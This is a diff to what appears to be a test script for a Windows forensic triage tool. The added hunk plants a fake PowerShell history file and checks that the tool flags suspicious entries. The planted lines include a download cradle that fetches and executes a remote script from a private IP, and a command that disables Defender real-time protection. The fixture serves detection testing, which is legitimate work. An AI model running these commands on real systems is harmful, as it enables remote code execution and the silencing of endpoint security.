@@ -245,6 +245,15 @@ reg(U + r'\AnyDesk', '/v', 'DisplayName', '/t', 'REG_SZ', '/d', 'AnyDesk')
 reg(U + r'\AnyDesk', '/v', 'Publisher', '/t', 'REG_SZ', '/d', 'AnyDesk Software GmbH')
 reg(U + r'\NotepadPP', '/v', 'DisplayName', '/t', 'REG_SZ', '/d', 'Notepad++ (64-bit x64)')
 
+# --- PowerShell PSReadLine history ------------------------------------------------
+psd = os.path.join(roam, 'PowerShell', 'PSReadLine')
+os.makedirs(psd, exist_ok=True)
+with open(os.path.join(psd, 'ConsoleHost_history.txt'), 'w', newline='') as f:
+    f.write('Get-ChildItem C:\\Users\r\n'
+            'IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.5/a.ps1")\r\n'
+            'Set-MpPreference -DisableRealtimeMonitoring $true\r\n'
+            'git status\r\n')
+
 # --- rdp: outgoing Remote Desktop history ---------------------------------------
 T = r'HKCU\Software\Microsoft\Terminal Server Client'
 reg(T + r'\Default', '/v', 'MRU0', '/t', 'REG_SZ', '/d', '10.10.5.21')
@@ -271,6 +280,8 @@ checks = [
                                ('as.exe', 'user-writable path')], ['w32time.dll', '%1']),
     (['firewall', '--json'], [('Test Listener', 'true')], ['Benign Block"']),
     (['programs', '--json'], [('"name":"AnyDesk"', 'remote-access (RMM) tool'), ('"rmm_tool":"AnyDesk"', None)], ['Notepad++']),
+    (['pshistory', '--json'], [('DownloadString', 'download cradle'), ('DisableRealtimeMonitoring', 'Defender'),
+                               ('"line":1', None)], ['Get-ChildItem', 'git status']),
     (['rdp', '--json'], [('"source":"Default","position":0', '"host":"10.10.5.21"'),
                          ('fileserver01.corp.example', '"position":1'),
                          ('"source":"Servers"', 'CORP\\\\svc_backup'), ('"certificate_accepted":true', None)], []),
